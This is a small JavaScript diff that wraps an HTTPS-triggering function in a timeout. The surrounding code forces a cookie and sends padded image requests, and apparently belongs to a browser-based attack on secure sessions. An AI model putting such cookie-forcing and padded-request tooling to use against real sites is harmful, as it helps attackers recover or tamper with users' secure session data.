@@ -98,7 +98,11 @@ function buildPadding(count) {
 function forceCookie(data) {
     document.cookie = reflectedCookieName + "=" + data + "; path=" + reflectedCookiePath + "; domain=" + reflectedCookieDomain + "; SECURE;";
 }
+
 function triggerHttps() {
+    setTimeout(doHttps, 100);
+}
+function doHttps() {
     var img = new Image();
     img.onerror = httpsTriggered;
     var padding = buildPadding(paddingCount);
